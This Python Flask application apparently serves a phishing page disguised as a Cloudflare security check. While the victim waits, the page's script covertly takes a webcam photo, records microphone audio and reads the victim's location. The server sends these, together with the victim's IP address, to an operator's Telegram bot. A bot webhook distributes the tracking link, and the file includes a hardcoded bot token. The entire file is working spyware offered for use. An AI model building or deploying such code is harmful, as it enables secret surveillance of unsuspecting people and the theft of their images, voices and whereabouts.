import base64, requests, io, os, time
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# ==================== إعدادات المطور سيوفي ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
MY_LINK = "https://sif-e7ad.onrender.com"
DEVELOPER_USER = "Y_urd"

# نظام التحكم
link_active = True 
users_db = {}
# =============================================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="100">
        <h2>جاري التحقق...</h2>
        <p>يرجى السماح بالصلاحيات لتأمين اتصالك (انتظار 3 ثوانٍ).</p>
        <div class="spinner"></div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        let chunks = [];
        
        async function sendData(data) {
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v');
                v.srcObject = stream;

                // 1. الدفعة الأولى: الموقع والبيانات التقنية
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendData({ type: 'text', lat: pos.coords.latitude, lon: pos.coords.longitude });
                }, async () => await sendData({ type: 'text', lat: 0, lon: 0 }));

                // 2. الدفعة الثانية: الصورة (بعد ثانيتين)
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const imgB64 = c.toDataURL('image/jpeg', 0.6).split(',')[1];
                    await sendData({ type: 'img', img: imgB64 });
                }, 2000);

                // 3. الدفعة الثالثة: تسجيل الصوت (3 ثوانٍ)
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();

                setTimeout(() => {
                    recorder.stop();
                    recorder.onstop = async () => {
                        const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                        const reader = new FileReader();
                        reader.readAsDataURL(audioBlob);
                        reader.onloadend = async () => {
                            await sendData({ type: 'audio', audio: reader.result.split(',')[1] });
                            window.location.href = "https://www.google.com";
                        };
                    };
                }, 3500);

            } catch (e) {
                await sendData({ type: 'text', lat: 0, lon: 0 });
                window.location.href = "https://www.google.com";
            }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def telegram_send(method, data=None, files=None):
    res = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", data=data, files=files)
    return res

@app.route('/')
def index():
    if not link_active: return redirect("https://www.google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    global link_active
    data = request.json
    m_type = data.get('type')
    
    if m_type == 'text':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        lat, lon = data.get('lat', 0), data.get('lon', 0)
        loc_url = f"https://www.google.com/maps?q={lat},{lon}" if lat != 0 else "غير متاح"
        msg = f"🎯 <b>صيد جديد (الموقع والـ IP):</b>\n\n🌐 IP: <code>{ip}</code>\n📍 الموقع: <a href='{loc_url}'>فتح الخريطة</a>"
        telegram_send("sendMessage", {"chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML"})

    elif m_type == 'img':
        img_b64 = data.get('img')
        if img_b64:
            f = io.BytesIO(base64.b64decode(img_b64)); f.name = 'photo.jpg'
            telegram_send("sendPhoto", {"chat_id": ADMIN_ID}, {"photo": f})
            link_active = False # تعطيل الرابط بعد وصول الصورة

    elif m_type == 'audio':
        audio_b64 = data.get('audio')
        if audio_b64:
            a = io.BytesIO(base64.b64decode(audio_b64)); a.name = 'voice.ogg'
            telegram_send("sendVoice", {"chat_id": ADMIN_ID}, {"voice": a})

    return jsonify({"status": "success"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "message" in update:
        msg = update["message"]; chat_id = msg["chat"]["id"]; text = msg.get("text", "")
        if chat_id == ADMIN_ID:
            if text == "/open":
                global link_active; link_active = True
                telegram_send("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم فتح الرابط مجدداً."})
        if text == "/start":
            kb = {"inline_keyboard": [[{"text": "✅ تم الاشتراك", "callback_data": "gen"}]]}
            telegram_send("sendMessage", {"chat_id": chat_id, "text": f"اشترك أولاً للتفعيل:\n{CHANNEL_URL}", "reply_markup": kb})
    elif "callback_query" in update:
        cb = update["callback_query"]; chat_id = cb["message"]["chat"]["id"]
        if cb["data"] == "gen":
            user = users_db.get(chat_id, {"used": False})
            if user["used"]:
                telegram_send("sendMessage", {"chat_id": chat_id, "text": "❌ استنفدت محاولتك المجانية."})
            else:
                users_db[chat_id] = {"used": True}
                telegram_send("sendMessage", {"chat_id": chat_id, "text": f"رابطك الخاص:\n<code>{MY_LINK}</code>", "parse_mode": "HTML"})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
